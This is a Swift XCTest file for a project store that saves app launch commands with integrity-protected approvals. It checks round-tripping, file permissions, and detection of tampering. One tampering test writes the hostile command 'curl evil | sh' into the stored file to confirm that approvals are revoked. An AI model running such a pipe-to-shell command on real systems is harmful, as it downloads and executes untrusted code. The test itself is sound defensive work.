import Foundation
import Models
import Store
import XCTest

final class ProjectStoreTests: XCTestCase {
    private var directory: URL!

    override func setUpWithError() throws {
        directory = FileManager.default.temporaryDirectory
            .appendingPathComponent("RunnerKitStoreTests-\(UUID().uuidString)", isDirectory: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: directory)
    }

    private func makeStore(key: UInt8 = 7) -> ProjectStore {
        ProjectStore(
            paths: StorePaths(supportDirectory: directory, logsDirectory: directory.appendingPathComponent("Logs")),
            keyProvider: StaticStoreKey(Data(repeating: key, count: 32))
        )
    }

    private func approvedProject() -> Project {
        Project(
            name: "docs", path: "/Users/me/docs", detector: .node, command: .argv(["pnpm", "run", "dev"]),
            envOverrides: ["API_URL": "http://localhost:4000"], envFiles: [".env.local"],
            approval: Approval(fingerprint: "abc", approvedAt: Date(timeIntervalSince1970: 1_700_000_000.123),
                               displayedCommand: "pnpm run dev", resolvedScript: "next dev")
        )
    }

    func testRoundTripKeepsApprovals() async throws {
        let store = makeStore()
        let project = approvedProject()
        try await store.save([project])
        let result = try await store.load()
        XCTAssertTrue(result.integrityOK)
        XCTAssertEqual(result.projects, [project])
    }

    func testFileModeIs0600() async throws {
        try await makeStore().save([approvedProject()])
        let attrs = try FileManager.default.attributesOfItem(atPath: directory.appendingPathComponent("projects.json").path)
        XCTAssertEqual((attrs[.posixPermissions] as? NSNumber)?.intValue, 0o600)
    }

    func testTamperedStoreInvalidatesApprovals() async throws {
        let store = makeStore()
        try await store.save([approvedProject()])
        let url = directory.appendingPathComponent("projects.json")
        let text = try String(contentsOf: url, encoding: .utf8)
        try text.replacingOccurrences(of: "next dev", with: "curl evil | sh").write(to: url, atomically: true, encoding: .utf8)

        let result = try await store.load()
        XCTAssertFalse(result.integrityOK)
        XCTAssertEqual(result.projects.count, 1)
        XCTAssertNil(result.projects.first?.approval)
    }

    func testDifferentKeyInvalidatesApprovals() async throws {
        try await makeStore(key: 1).save([approvedProject()])
        let result = try await makeStore(key: 2).load()
        XCTAssertFalse(result.integrityOK)
        XCTAssertNil(result.projects.first?.approval)
    }

    func testMissingFileIsEmpty() async throws {
        let result = try await makeStore().load()
        XCTAssertTrue(result.projects.isEmpty)
        XCTAssertTrue(result.integrityOK)
    }
}
